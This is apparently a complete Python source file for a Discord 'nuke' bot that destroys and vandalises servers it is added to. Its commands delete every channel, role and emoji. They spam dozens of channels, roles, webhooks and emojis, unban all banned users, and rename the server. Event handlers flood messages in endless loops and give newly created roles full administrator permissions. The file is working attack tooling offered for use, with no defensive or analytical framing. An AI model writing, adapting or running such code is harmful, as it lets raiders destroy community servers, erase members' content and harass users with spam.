# -*- coding:utf-8 -*-
import discord
from discord import client
from discord.errors import Forbidden, HTTPException, InvalidArgument, NotFound
from discord.ext import commands
import random
from discord import Permissions
from colorama import init, Fore
init(convert= True)
import asyncio
import threading
import emoji
import time
import os
import json

intents = discord.Intents().all()

with open("config.json", encoding="utf-8")as fileInp:
    config = json.load(fileInp)

TOKEN = config.get("Token")
PREFIX = config.get("Prefix")
SPAM_CHANNEL = config.get("Spam-Channel")
SERVER_NAME = config.get("Server-Name")
SPAM_MESSAGE = config.get("Spam-Message")
SPAM_ROLE = config.get("Spam-Role")
USER_UNBAN = config.get("User-Unban")
ROLE_COLOUR = config.get("Role-Colour")
WEBHOOK_NAME = config.get("Webhook-Name")
SUPPLY = config.get("Supply")


i = os.listdir(r"Images")
x = r"Images"
lst = []
binary_lst = []
for f in i:
    p = os.path.join(x, f)
    lst.append(p)
for v in lst:
    with open(v, "rb")as o:
        k = o.read()
        binary_lst.append(k)

bot = commands.Bot(command_prefix="{}".format(PREFIX), intents=intents)
client = discord.Client()

@bot.event
async def on_ready():
    print(f'''{Fore.LIGHTCYAN_EX}
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║                                                                       ║
    ║                                                                       ║
    ║                            ░▀██░▀██░█▀█░▄█                            ║
    ║                            ░▄▄█░▄▄█░█▄█░░█                            ║
    ║                                                                       ║
    ║                                                                       ║
    ╚═══════════════════════════════════════════════════════════════════════╝''' + Fore.RESET)
    await bot.change_presence(activity=discord.Game(name="Absolute Zero"))


@bot.command()
@commands.is_owner()
async def Stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"Cicaid: {client.user.name} has logged out successfully." + Fore.RESET)

@bot.command(aliases = ["nuke"])
async def Nuke(ctx):
    guild = ctx.guild
    await ctx.guild.edit(name = "wat?", description = "YAYVIDEOGAMES", icon = binary_lst[2], banner = binary_lst[1])
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.LIGHTGREEN_EX + f"Cicaid: Successfully deleted {channel.name}." + Fore.RESET)
        except Forbidden:
            print(Fore.RED + f"Cicaid: Missing permissions to delete {channel.name}." + Fore.RESET)
        except NotFound:
            print(Fore.RED + f"Cicaid: Could not find the following channel to delete!" + Fore.RESET)
        except HTTPException:
            print(Fore.RED + f"Cicaid: Failed when trying to delete guild's channels!" + Fore.RESET)
        except:
            print(Fore.RED + f"Cicaid: An unknown error occured while trying to delete channels" + Fore.RESET)
    await guild.create_text_channel("moonlight community has awoken")
    amount = 75
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban(USER_UNBAN)
            print(Fore.LIGHTGREEN_EX + f"Cicaid: Successfully unbanned {user.name}#{user.discriminator}." + Fore.RESET)
        except Forbidden:
            print(Fore.RED + f"Cicaid: Missing permissions to unban {user.name}#{user.discriminator}." + Fore.RESET)
        except HTTPException:
            print(Fore.RED + f"Cicaid: Failed when trying to unban {user.name}#{user.discriminator}" + Fore.RESET)
        except:
            print(Fore.RED + f"Cicaid: An unknown error occured while unbanning {user.name}#{user.discriminator}" + Fore.RESET)
    print(Fore.LIGHTCYAN_EX + f"Cicaid: Main Nuking Task Done!" + Fore.RESET)

@bot.command(alieases = ["awoken"])
async def Awoken(ctx):
    message = ctx.message
    for w in range(10):
        try:
           await message.channel.create_webhook(name = random.choice(WEBHOOK_NAME))
           print(Fore.LIGHTGREEN_EX + f"Cicaid: Spamming webhooks" + Fore.RESET)
        except Forbidden:
           print(Fore.RED + f"Cicaid: Missing permissions to spam webhooks!" + Fore.RESET)
        except HTTPException:
            print(Fore.RED + f"Cicaid: Failed when trying to spam webhooks!" + Fore.RESET)
        except:
            print(Fore.RED + f"Cicaid: An unknown error occured while trying to spam webhooks!" + Fore.RESET)
    print(Fore.LIGHTCYAN_EX + f"Cicaid: Webhook Task Done!" + Fore.RESET)

@bot.command(aliases = ["doom"])
async def Doom(ctx):
    guild = ctx.guild
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.LIGHTGREEN_EX + f"Cicaid: Successfully deleted {role.name}." + Fore.RESET)
        except Forbidden:
            print(Fore.RED + f"Cicaid: Missing permissions to delete {role.name}!" + Fore.RESET)
        except HTTPException:
            print(Fore.RED + f"Cicaid: Failed when trying to delete {role.name}!" + Fore.RESET)
        except:
            print(Fore.RED + f"Cicaid: An unknown error occured while trying to delete {role.name}!" + Fore.RESET)       
    print(Fore.LIGHTCYAN_EX + f"Cicaid: Role Deleting Task Done!" + Fore.RESET) 

@bot.command()
async def Bye(ctx):
    for aemoji in range(250):
        guild = ctx.guild
        try:
           await guild.create_custom_emoji(name = "always on work DR go bye bye", image = bytearray(binary_lst[3]))
           print(Fore.LIGHTGREEN_EX + f"Cicaid: Spamming emojis" + Fore.RESET)
        except Forbidden:
            print(Fore.RED + f"Cicaid: Missing permissions to spam emojis" + Fore.RESET)
        except HTTPException:
            print(Fore.RED + f"Cicaid: Failed when trying to spam emojis!" + Fore.RESET)
        except:
            print(Fore.RED + f"Cicaid: An unknown error occured while trying to spam emojis!" + Fore.RESET)
    print(Fore.LIGHTCYAN_EX + f"Cicaid: Spamming Emoji Task Done!" + Fore.RESET)

@bot.command(aliases = ["tanthe"])
async def TanThe(ctx):
    n = 0
    while n <= 50:
        try:
            await ctx.guild.create_role()
            print(Fore.LIGHTGREEN_EX + f"Cicaid: Spamming roles" + Fore.RESET)
            n += 1
        except Forbidden:
            print(Fore.RED + f"Cicaid: Missing permissions to spam roles!" + Fore.RESET)
            n += 1
        except InvalidArgument:
            print(Fore.RED + f"Cicaid: Invalid argument was given when trying to spam roles!" + Fore.RESET)    
            n += 1
        except HTTPException:
            print(Fore.RED + f"Cicaid: Failed when trying to spam roles!" + Fore.RESET)
            n += 1
        except:
            print(Fore.RED + f"Cicaid: An unknown error occured while trying to spam roles!" + Fore.RESET)
    else:
        print(Fore.LIGHTCYAN_EX + f"Cicaid: Role Spamming Task Done!" + Fore.RESET)

@bot.command(aliases = ["gone"])
async def Gone(ctx):
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.LIGHTGREEN_EX + f"Cicaid: Successfully deleted {emoji.name}." + Fore.RESET)
        except Forbidden:
            print(Fore.RED + f"Cicaid: Missing permissions to delete {emoji.name}!" + Fore.RESET)
        except HTTPException:
            print(Fore.RED + f"Cicaid: Failed when trying to delete {emoji.name}!" + Fore.RESET)
        except:
            print(Fore.RED + f"Cicaid: An unknown error occured while trying to delete {emoji.name}" + Fore.RESET)
    print(Fore.LIGHTCYAN_EX + f"Cicaid: Emoji Task Done!" + Fore.RESET)

@bot.command()
async def Pain(ctx):
    for i in USER_UNBAN:
        try:
            m = await ctx.guild.fetch_member("{}".format(i))
            role = discord.utils.get(ctx.guild.roles, name = "siu phẻn động")
            await m.add_roles(role)
            print(Fore.GREEN + "Cicaid: Successfully given role to {}".format(await bot.fetch_user(i)) + Fore.RESET)
        except NotFound:
            print(Fore.RED + "Cicaid: User {} was not found!".format(await bot.fetch_user(i)) + Fore.RESET)
        except HTTPException:
            print(Fore.RED + "Cicaid: Failed when trying to give role to {}".format(await bot.fetch_user(i)) + Fore.RESET)
        except:
            print(Fore.RED + "Cicaid: An unknown error occured while trying to give role!")

@bot.command()
async def RealDestruction(ctx):
    while True:
        await asyncio.gather(Gone(ctx), Doom(ctx), Awoken(ctx), TanThe(ctx), Nuke(ctx), Bye(ctx))
        asyncio.run(RealDestruction(ctx))

@bot.command()
async def Chon(ctx):
  while True:
    for i in list(ctx.guild.channels):
      await i.send(random.choice(SPAM_MESSAGE))

@bot.command(aliases = ["oof", "absolute zero", "absolutezero", "az"])
async def RealJujutsu(ctx):
    await ctx.message.delete()
    loop = asyncio.get_event_loop()
    id_channel = ctx.message.channel.id
    c = bot.get_channel(id_channel)
    await c.send("`Imagine a future version of myself who's freely surpassed my limits!`")
    time.sleep(1)
    await c.send("`I'll do it!`")
    time.sleep(1)
    await c.send("`With a strong foundation,`")
    time.sleep(1)
    await c.send("`and a little bit of sense and imagination,`")
    time.sleep(1)
    await c.send("`it just takes the slightest trigger to change a person`")
    time.sleep(1)
    await c.send("**`Domain Expansion:`**")
    time.sleep(1.2)
    await c.send(emoji.emojize("**`❄️ Absolute Zero ❄️`**"))
    time.sleep(1.2)
    async def Poor(ctx):
        threading.Thread(target=await (RealDestruction(ctx)), args=(ctx,)).start()
    await asyncio.ensure_future(Poor(ctx))
    loop.run_forever()

@bot.event
async def on_guild_integrations_update(guild):
    while True:
        await guild.edit(name = random.choice(SERVER_NAME) + random.choice(SUPPLY), description = emoji.emojize("UBISOFT GOES STEAMWORKS BYE BYE, ALWAYS ON DRM. :joy: :joy: :sunglasses:"), icon = random.choice(binary_lst), banner = random.choice(binary_lst))
@bot.event
async def on_guild_role_create(role):
    while True:
      await role.edit(name = random.choice(SPAM_ROLE), colour = random.choice(ROLE_COLOUR), permissions = Permissions.all())
@bot.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))



bot.run(TOKEN, bot=True)
